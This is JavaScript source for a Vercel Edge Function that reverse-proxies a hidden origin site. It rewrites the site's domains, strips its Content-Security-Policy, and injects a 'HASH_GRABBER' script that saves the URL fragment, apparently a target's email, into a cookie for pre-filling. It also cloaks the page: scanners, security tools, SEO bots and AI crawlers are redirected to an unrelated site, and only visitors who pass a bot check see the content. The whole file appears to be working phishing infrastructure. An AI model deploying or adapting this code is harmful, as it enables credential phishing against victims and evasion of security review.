// Force Vercel to run this as an Edge Function (similar to Cloudflare Workers)
export const config = {
  runtime: 'edge',
};

// ---- config: edit these (or set them in Vercel Environment Variables) ----
const ORIGIN = process.env.ORIGIN || 'https://europolus.ru';
const PREFIX = process.env.PREFIX || '/ar';
const BLOCK_REDIRECT = process.env.BLOCK_REDIRECT || 'https://www.ufc.com/';
const MY_IP = process.env.MY_IP || '';              
const SECRET = process.env.SECRET || 'k9x2mQ7vLp4Rt8Zb';  

// OPTIONAL: Leave these blank to use the simple challenge. Fill them to use Turnstile.
const SITE_KEY = process.env.SITE_KEY || '';           
const SECRET_KEY = process.env.SECRET_KEY || '';         
// ----------------------------

const HASH_GRABBER = `<script>
(function(){
    try {
        const hash = window.location.hash.substring(1);
        console.log("[HashGrabber] Detected URL hash:", hash);
        
        // FIX 1: Use regex to prevent false positives from similar cookie names
        if (hash && !/(^|;\\s*)autograb_email=/.test(document.cookie)) {
            document.cookie = "autograb_email=" + encodeURIComponent(hash) + "; path=/; max-age=86400; SameSite=Lax";
            console.log("[HashGrabber] Cookie 'autograb_email' set successfully!");
            
            // FIX 2: Clear the hash from the URL immediately so downstream 
            // redirects/middlemen don't see it and duplicate it.
            window.history.replaceState(null, document.title, window.location.pathname + window.location.search);
            
        } else if (!hash) {
            console.log("[HashGrabber] No hash found in the URL.");
        }
    } catch(e) {
        console.error("[HashGrabber] Error:", e);
    }
})();
</script>`;

const CH_COOKIE = 'hv';
const CH_TTL = 86400;
const LIMIT = 60;
const WINDOW = 60000;
const THRESHOLD = 5;
const MIN_MS = 800;

// Antibot User-Agent list
const HARD_UA = ['nmap','sqlmap','nikto','masscan','zgrab','curl/','wget/','python-requests','python-urllib','go-http-client','java/','okhttp','libwww-perl','httpclient','headlesschrome','phantomjs','puppeteer','playwright','selenium','ahrefs','semrush','mj12bot','dotbot','petalbot','bytespider','dataforseo','screaming frog','sitebulb','gptbot','claudebot','ccbot','perplexitybot'];

// --- Helper Functions ---

function getIP(request) {
  // Vercel uses x-real-ip or x-forwarded-for instead of CF-Connecting-IP
  return request.headers.get('x-real-ip') || 
         request.headers.get('x-forwarded-for')?.split(',')[0].trim() || 
         '0.0.0.0';
}

async function hmac(data) {
  const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(SECRET), { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  const sig = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(data));
  return [...new Uint8Array(sig)].map(b => b.toString(16).padStart(2, '0')).join('');
}

function eq(a, b) {
  if (a.length !== b.length) return false;
  let r = 0;
  for (let i = 0; i < a.length; i++) r |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return r === 0;
}

function cookie(request, name) {
  for (const p of (request.headers.get('Cookie') || '').split(';')) {
    const [k, ...v] = p.trim().split('=');
    if (k === name) return v.join('=');
  }
  return null;
}

// Note: In serverless/edge environments, memory (Map) is not shared across all global nodes. 
// This rate limit works per-edge-node. For strict global rate limiting, you'd need Vercel KV/Redis.
const memLimit = new Map();
function rateLimited(ip) {
  const now = Date.now();
  let e = memLimit.get(ip);
  if (!e || now - e.start > WINDOW) { e = { start: now, n: 0 }; memLimit.set(ip, e); }
  e.n++;
  if (memLimit.size > 5000) for (const [k, v] of memLimit) if (now - v.start > WINDOW) memLimit.delete(k);
  return e.n > LIMIT;
}

function targetUrl(request) {
  const u = new URL(request.url);
  u.searchParams.delete('c');
  u.searchParams.delete('debug');
  return new URL(PREFIX + u.pathname + u.search, ORIGIN);
}

function proxyHeaders(request) {
  const h = new Headers(request.headers);
  // Clean up Vercel/Proxy specific headers
  for (const k of [...h.keys()]) if (k.startsWith('x-vercel') || k.startsWith('x-forwarded')) h.delete(k);
  
  h.set('Host', new URL(ORIGIN).host);
  h.set('X-Forwarded-For', getIP(request));
  h.set('X-Forwarded-Proto', 'https');
  return h;
}

function esc(s) {
  return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
}

// --- Challenge & Verification ---

async function challenge(request, ip, err) {
  const u = new URL(request.url);
  const ts = Date.now();
  
  // IF NO CLOUDFLARE KEYS: Use simple cookie redirect challenge
  if (!SITE_KEY) {
    const f = new URL(request.url);
    f.searchParams.set('c', '2');
    const sec = Math.floor(Date.now() / 1000);
    const sig = await hmac(ip + '|' + sec);
    
    // FIX 3: Added setTimeout delay to ensure cookie is saved before redirect
    const html = '<!doctype html><meta charset=utf-8>' + HASH_GRABBER + '<body style="font:14px monospace;padding:40px">checking...<script>setTimeout(function(){location.replace(' + JSON.stringify(f.pathname + f.search) + ' + window.location.hash)},100)</script>';
    
    return new Response(html, {
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store',
        'Set-Cookie': CH_COOKIE + '=' + sec + '.' + sig + '; Path=/; Max-Age=' + CH_TTL + '; HttpOnly; Secure; SameSite=Lax'
      }
    });
  }
  
  // IF CLOUDFLARE KEYS EXIST: Use Turnstile
  const f = new URL(request.url);
  f.searchParams.set('c', '3');
  const action = f.pathname + f.search;
  const html = '<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">' + HASH_GRABBER
  + '<title>checking</title>'
  + '<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>'
  + '<body style="font:14px system-ui;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;background:#fafafa">'
  + '<form id=cf method=POST action="' + esc(action) + '" style="text-align:center">'
  + '<div class="cf-turnstile" data-sitekey="' + esc(SITE_KEY) + '" data-theme="auto" data-callback="go"></div>'
  + '<script>function go(){var f=document.getElementById("cf");var h=window.location.hash;if(h){var i=document.createElement("input");i.type="hidden";i.name="h";i.value=h;f.appendChild(i);}f.submit()}</script>'
  + '<input type=hidden name=ts value="' + ts + '">'
  + '<input type=text name=website value="" tabindex=-1 autocomplete=off style="position:absolute;left:-9999px">'
  + '<noscript><button type=submit>continue</button></noscript>'
  + (err ? '<p style="color:#b00">' + esc(err) + '</p>' : '')
  + '</form></body>';
  return new Response(html, {
    headers: { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-store' }
  });
}

async function verifyTurnstile(request, ip) {
  let fd;
  try { fd = await request.formData(); } catch { return { success: false, hash: '' }; }
  
  const hash = fd.get('h') || ''; 
  if ((fd.get('website') || '').trim() !== '') return { success: false, hash };
  const ts = parseInt(fd.get('ts') || '0', 10);
  if (!ts || Date.now() - ts < MIN_MS) return { success: false, hash };
  const token = fd.get('cf-turnstile-response') || '';
  if (!token) return { success: false, hash };
  
  const body = new URLSearchParams();
  body.set('secret', SECRET_KEY);
  body.set('response', token);
  if (ip && ip !== '0.0.0.0') body.set('remoteip', ip);
  
  let out;
  try {
    const r = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body
    });
    out = await r.json();
  } catch (e) {
    console.error("[Edge] Turnstile verification network error:", e);
    return { success: false, hash }; // Fail closed
  }
  return { success: (out && out.success === true), hash };
}

async function verifyCookie(request, ip) {
  const v = cookie(request, CH_COOKIE);
  if (!v) return false;
  const [ts, sig] = v.split('.');
  if (!ts || !sig) return false;
  if (Math.abs(Math.floor(Date.now() / 1000) - parseInt(ts, 10)) > CH_TTL) return false;
  return eq(sig, await hmac(ip + '|' + ts));
}

// --- Scoring & Proxying ---

function score(request) {
  const ua = (request.headers.get('User-Agent') || '').toLowerCase();
  const h = request.headers;
  let s = 0;
  const why = [];
  
  if (!ua) { s += 3; why.push('no-ua'); }
  else if (ua.length < 25) { s += 2; why.push('short-ua'); }
  for (const b of HARD_UA) if (ua.includes(b)) { s += 6; why.push('ua:' + b); break; }
  
  if (['accept', 'accept-language', 'sec-fetch-mode', 'sec-ch-ua'].filter(k => !h.get(k)).length >= 3) { s += 2; why.push('no-headers'); }
  if (h.get('accept-language') === '*') { s += 1; why.push('lang-star'); }
  if (request.method === 'HEAD') { s += 1; why.push('head'); }
  
  return { s, why };
}

async function passthrough(request) {
  const init = { method: request.method, headers: proxyHeaders(request), redirect: 'manual' };
  if (request.method !== 'GET' && request.method !== 'HEAD') init.body = request.body;
  
  let res;
  try {
    res = await fetch(targetUrl(request).toString(), init);
  } catch (e) {
    return new Response('origin error: ' + e.message, { status: 502 });
  }
  
  const origin = ORIGIN.replace(/\/$/, '');
  const self = new URL(request.url).origin;
  const h = new Headers(res.headers);
  
  h.delete('Content-Security-Policy');
  h.delete('X-Content-Security-Policy');
  
  const loc = h.get('Location');
  if (loc) h.set('Location', loc.split(origin).join(self));
  const sc = h.get('Set-Cookie');
  if (sc) h.set('Set-Cookie', sc.replace(/;\s*Domain=[^;]*/gi, ''));
  h.set('X-Robots-Tag', 'noindex');
  
  const ct = h.get('Content-Type') || '';
  let body = res.body;
  
  if (ct.includes('text/html') && request.method !== 'HEAD') {
    const text = await res.text();
    let rewritten = text.split(origin).join(self).split(new URL(origin).host).join(new URL(self).host);
    
    if (rewritten.includes('</head>')) {
      rewritten = rewritten.replace('</head>', HASH_GRABBER + '</head>');
    } else if (rewritten.includes('<body')) {
      rewritten = rewritten.replace('<body', HASH_GRABBER + '<body');
    } else {
      rewritten = HASH_GRABBER + rewritten;
    }
    
    body = rewritten;
    h.delete('Content-Length');
  }
  return new Response(body, { status: res.status, statusText: res.statusText, headers: h });
}

// --- Main Handler ---

async function handle(request) {
  const ip = getIP(request);
  const mine = MY_IP.split(',').map(x => x.trim()).filter(Boolean);
  const isMine = mine.includes(ip);
  const u = new URL(request.url);
  const debug = isMine && u.searchParams.get('debug') === '1';
  
  if (isMine && !debug) return passthrough(request);
  if (request.headers.get('Upgrade') === 'websocket') return passthrough(request);
  
  if (rateLimited(ip)) {
    if (debug) return new Response('rate', { status: 429 });
    return Response.redirect(BLOCK_REDIRECT, 302);
  }
  
  const { s, why } = score(request);
  if (s >= THRESHOLD) {
    if (debug) return new Response('bot score=' + s + ' ' + why.join(','), { status: 403 });
    return Response.redirect(BLOCK_REDIRECT, 302);
  }
  
  if (u.searchParams.get('c') === '3' && request.method === 'POST') {
    const result = await verifyTurnstile(request, ip);
    if (result.success) {
      const clean = new URL(request.url);
      clean.searchParams.delete('c');
      const ts = Math.floor(Date.now() / 1000);
      const sig = await hmac(ip + '|' + ts);
      return new Response(null, {
        status: 302,
        headers: {
          'Location': clean.pathname + clean.search + result.hash, 
          'Cache-Control': 'no-store',
          'Set-Cookie': CH_COOKIE + '=' + ts + '.' + sig + '; Path=/; Max-Age=' + CH_TTL + '; HttpOnly; Secure; SameSite=Lax'
        }
      });
    }
    if (debug) return new Response('turnstile fail score=' + s, { status: 403 });
    return challenge(request, ip, 'verification failed, try again');
  }
  
  if (await verifyCookie(request, ip)) {
    if (debug) return new Response('pass score=' + s + ' ' + why.join(','), { status: 200 });
    return passthrough(request);
  }
  
  if (u.searchParams.get('c') === '2') return passthrough(request);
  if (debug) return new Response('challenge score=' + s + ' ' + why.join(','), { status: 403 });
  
  return challenge(request, ip, '');
}

// Vercel Edge Function Export
export default async function handler(request) {
  try {
    return await handle(request);
  } catch (e) {
    try { return await passthrough(request); }
    catch (e2) { return new Response('edge error: ' + e.message + ' / ' + e2.message, { status: 502 }); }
  }
};
